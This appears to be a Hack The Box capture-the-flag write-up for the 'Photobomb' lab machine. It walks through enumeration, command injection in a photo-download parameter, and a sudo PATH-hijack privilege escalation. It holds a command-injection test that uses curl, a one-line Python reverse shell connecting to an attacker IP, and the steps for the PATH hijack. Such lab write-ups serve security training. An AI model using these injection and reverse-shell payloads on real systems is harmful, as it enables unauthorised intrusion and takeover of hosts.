# Hack-The-Box-writeups
Photobomb
1. Enumeration 
Let's start with a Nmap scan to discover services and open ports running on this machine.
nmap -sV -Sc 10.10.11.182
 
There are only two open ports, port 22 and port 80 
- Web content and Subdomain enumeration don’t show anything  

2. Port 80 enumeration
photobomb.htb
 
This link redirects to /printer which is asking for a username and password that we don’t know.
 
Photobomb.htb source code 
 
Let's take a look at this JS file: 

Now let's log in with those credentials 
 
The website offers "DOWNLOAD PHOTO TO PRINT"
Let's intercept the request using Burpsuite  
 
It seems vulnerable to command injection
Let's test for command injection, start "python web server" 
1. python3 -m http.server
2. inject ;curl+10.10.x.x:8000 to each parameter 
 
 


We found that only the filetype parameter is vulnerable 
Lets create some reverse shell: https://www.revshells.com/ 
export+RHOST="10.10.14.34";export+RPORT=5555;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("sh")'
Start the Netcat listener 

 

3. Privilege Escalation
Lets upgrade our shell 
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'

Before running linpeas lets try the classic ways 
 
User wizard can run "cleanup.sh" with "sudo" privilege 



Lets check this script
 
So there are two interesting, “cd” and "find" called without their absolute path. so, we can exploit this misconfiguration by changing the "PATH variable"   
Lets create "cd" file that contains '/bin/bash'  and give 777 permission
 
Add /tmp to the beginning of the PATH variable 
 
 


